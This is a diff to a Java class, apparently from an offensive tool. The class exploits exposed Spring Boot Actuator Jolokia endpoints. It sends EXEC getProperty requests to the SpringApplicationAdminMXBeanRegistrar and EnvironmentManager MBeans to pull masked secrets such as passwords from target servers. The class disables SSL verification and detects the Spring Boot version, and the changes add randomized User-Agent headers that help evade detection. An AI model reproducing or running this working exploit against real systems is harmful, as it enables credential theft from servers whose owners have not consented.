@@ -1,5 +1,6 @@
 package src.main.module;
 
+import src.main.common.UA_Config;
 import src.main.impl.ResultCallback;
 
 import java.io.BufferedReader;
@@ -9,6 +10,7 @@ import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
+import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -36,10 +38,15 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        String ua = "";
         disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -58,6 +65,8 @@ public class GetSpPassWord_I {
                 }
                 URL obj1 = new URL(site);
                 HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                ua = uacf.getRandomUserAgent(ualist);
+                conn1.setRequestProperty("User-Agent",ua);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type", "application/json");
                 conn1.setDoOutput(true);
@@ -84,10 +93,12 @@ public class GetSpPassWord_I {
                         }
                     }
                 }else{
-                    callback.onResult("网络连接错误");
+                    text = "网络连接错误";
+                    callback.onResult(text);
                 }
             }else{
-                callback.onResult("没有发现jolokia依赖");
+                text = "没有发现jolokia依赖";
+                callback.onResult(text);
             }
             in.close();
         }catch (Exception e) {
@@ -102,10 +113,15 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.boot:name=SpringApplication,type=Admin\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        String ua = "";
         disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -124,6 +140,8 @@ public class GetSpPassWord_I {
                 }
                 URL obj1 = new URL(site);
                 HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                ua = uacf.getRandomUserAgent(ualist);
+                conn1.setRequestProperty("User-Agent",ua);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type", "application/json");
                 conn1.setDoOutput(true);
@@ -150,13 +168,17 @@ public class GetSpPassWord_I {
                         }
                     }
                 }else{
-                    callback.onResult("网络连接错误");
+                    text = "网络连接错误";
+                    callback.onResult(text);
                 }
             }else{
-                callback.onResult("没有发现jolokia依赖");
+                text = "没有发现jolokia依赖";
+                callback.onResult(text);
             }
             in.close();
         }catch (Exception e) {
+            text = "发起请求异常";
+            callback.onResult(text);
             e.printStackTrace();
         }
     }
@@ -171,10 +193,15 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        String ua = "";
         disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -192,6 +219,8 @@ public class GetSpPassWord_I {
                     callback.onResult(text);                }
                 URL obj1 = new URL(site);
                 HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                ua = uacf.getRandomUserAgent(ualist);
+                conn1.setRequestProperty("User-Agent",ua);
                 conn1.setRequestMethod("POST");
                 conn1.setRequestProperty("Content-Type", "application/json");
                 conn1.setDoOutput(true);
@@ -218,13 +247,17 @@ public class GetSpPassWord_I {
                         }
                     }
                 }else{
-                    callback.onResult("网络连接错误");
+                    text = "网络连接错误";
+                    callback.onResult(text);
                 }
             }else{
-                callback.onResult("没有发现jolokia");
+                text = "没有发现jolokia";
+                callback.onResult(text);
             }
             in.close();
         }catch (Exception e) {
+            text = "发起请求异常";
+            callback.onResult(text);
             e.printStackTrace();
         }
     }
@@ -237,10 +270,15 @@ public class GetSpPassWord_I {
         String respValue = "value";
         String data = "{\"mbean\": \"org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager\",\"operation\": \"getProperty\", \"type\": \"EXEC\", \"arguments\": [\"%s\"]}";
         String expdata = String.format(data,args);
+        String ua = "";
         disableSSLVerification();
         try {
             URL obj = new URL(pocsite);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
@@ -258,6 +296,8 @@ public class GetSpPassWord_I {
                     callback.onResult(text);
                     URL obj1 = new URL(site);
                     HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
+                    ua = uacf.getRandomUserAgent(ualist);
+                    conn1.setRequestProperty("User-Agent",ua);
                     conn1.setRequestMethod("POST");
                     conn1.setRequestProperty("Content-Type", "application/json");
                     conn1.setDoOutput(true);
@@ -284,7 +324,8 @@ public class GetSpPassWord_I {
                             }
                         }
                     } else {
-                        callback.onResult("网络连接错误");
+                        text = "网络连接错误";
+                        callback.onResult(text);
                     }
                 }else{
                     text = "未找到依赖";
@@ -293,6 +334,8 @@ public class GetSpPassWord_I {
             }
             in.close();
         }catch (Exception e) {
+            text = "发起请求异常";
+            callback.onResult(text);
             e.printStackTrace();
         }
     }
@@ -301,35 +344,49 @@ public class GetSpPassWord_I {
         // Result1 3 为 sp1
         // Result2 4 为 sp2
         String site = address + "/actuator/env";
+        String ua = "";
         try {
             disableSSLVerification();
             URL obj = new URL(site);
             HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+            UA_Config uacf = new UA_Config();
+            List<String> ualist = uacf.loadUserAgents();
+            ua = uacf.getRandomUserAgent(ualist);
+            conn.setRequestProperty("User-Agent",ua);
             conn.setRequestMethod("GET");
             int responseCode = conn.getResponseCode();
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 // 存在路径是springboot2，否则是springboot1
-                callback.onResult("当前版本为springboot2");
+                text = "当前版本为springboot2";
+                callback.onResult(text);
                 if (clsvalue == 1) {
-                    callback.onResult("当前调用类为SpringApplicationAdminMXBeanRegistrar类");
+                    text = "当前调用类为SpringApplicationAdminMXBeanRegistrar类";
+                    callback.onResult(text);
                     Result2(callback);
                 } else if (clsvalue == 2) {
-                    callback.onResult("当前调用类为EnvironmentManager类");
+                    text = "当前调用类为EnvironmentManager类";
+                    callback.onResult(text);
                     Result4(callback);
                 }
             } else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND) {
-                callback.onResult("当前版本为springboot1");
+                text = "当前版本为springboot1";
+                callback.onResult(text);
                 if (clsvalue == 1) {
-                    callback.onResult("当前调用类为SpringApplicationAdminMXBeanRegistrar类");
+                    text = "当前调用类为SpringApplicationAdminMXBeanRegistrar类";
+                    callback.onResult(text);
                     Result1(callback);
                 } else if (clsvalue == 2) {
-                    callback.onResult("当前调用类为EnvironmentManager类");
+                    text = "当前调用类为EnvironmentManager类";
+                    callback.onResult(text);
                     Result3(callback);
                 }
             } else {
-                callback.onResult("未识别springboot版本");
+                text = "未识别springboot版本";
+                callback.onResult(text);
             }
         }catch (IOException e){
+            text = "发起请求异常";
+            callback.onResult(text);
             e.printStackTrace();
         }
     }
